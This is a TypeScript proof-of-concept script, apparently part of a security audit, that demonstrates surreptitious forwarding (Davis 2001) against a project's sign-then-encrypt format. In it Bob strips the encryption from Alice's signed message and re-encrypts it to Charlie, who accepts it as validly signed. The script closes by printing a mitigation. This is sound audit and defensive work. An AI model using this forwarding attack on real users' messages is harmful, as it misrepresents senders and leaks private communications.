/**
 * F-CRYPTO-02 — Surreptitious forwarding PoC (Davis 2001 attack on EBP encrypt+sign)
 *
 * Hypothesis: `Identity.signAndEncryptFor(message, recipient)` produces
 *   recipient.encrypt( JSON.stringify({ message, signature }) )
 * The inner blob does not bind to a recipient. So if Alice sends the blob to Bob,
 * Bob can decrypt to recover {message, signature}, then re-encrypt that same plaintext
 * to a third party Charlie. Charlie now sees a perfectly valid signed message from Alice
 * that Alice never sent to Charlie. Sender repudiation / surreptitious forwarding is
 * not prevented by the current wire format.
 *
 * Run from repo root:
 *   deno run -A wiki/security-audit-2026-04/pocs/F-CRYPTO-02-surreptitious-forwarding.ts
 */

import { Identity } from "../../../core/Identity.ts";
import { ExternalIdentity } from "../../../core/ExternalIdentity.ts";

function externalOf(identity: Identity): ExternalIdentity {
  return identity.summary;
}

const alice = new Identity("dilithium", "kyber");
const bob = new Identity("dilithium", "kyber");
const charlie = new Identity("dilithium", "kyber");

const aliceExt = externalOf(alice);
const bobExt = externalOf(bob);
const charlieExt = externalOf(charlie);

const secretMessage = "Hi Bob, the deal is yours alone. — Alice";

const ciphertextToBob = alice.signAndEncryptFor(secretMessage, bobExt);
console.log("Alice -> Bob (signed+encrypted) sent.");

const decryptedByBob = bob.decryptAndVerify(ciphertextToBob, aliceExt);
console.log(`Bob decrypted message: "${decryptedByBob.message}"`);
console.log(`Bob verified signature: ${decryptedByBob.verified}`);

const decryptedRaw = bob.encryptionKey.decrypt(ciphertextToBob);
const innerBlob = JSON.parse(decryptedRaw);
console.log("Bob now possesses both the plaintext AND Alice's raw signature for it.");

const reEncryptedToCharlie = Identity.EncryptFor(charlieExt, JSON.stringify(innerBlob));
console.log("Bob re-packages Alice's signed-message blob and encrypts it for Charlie.");

const charlieView = charlie.decryptAndVerify(reEncryptedToCharlie, aliceExt);
console.log(`Charlie sees message: "${charlieView.message}"`);
console.log(`Charlie's signature verification result: ${charlieView.verified}`);

if (charlieView.verified && charlieView.message === secretMessage) {
  console.log(
    "\nCONFIRMED F-CRYPTO-02: Charlie obtained a cryptographically valid 'signed message from Alice' that Alice never sent to Charlie.",
  );
  console.log(
    "Mitigation: bind sender + recipient fingerprints inside the signed inner payload, e.g. sign over {recipientFingerprint, message, salt}.",
  );
  Deno.exit(0);
}
console.log("\nFinding NOT reproduced — re-investigate.");
Deno.exit(1);
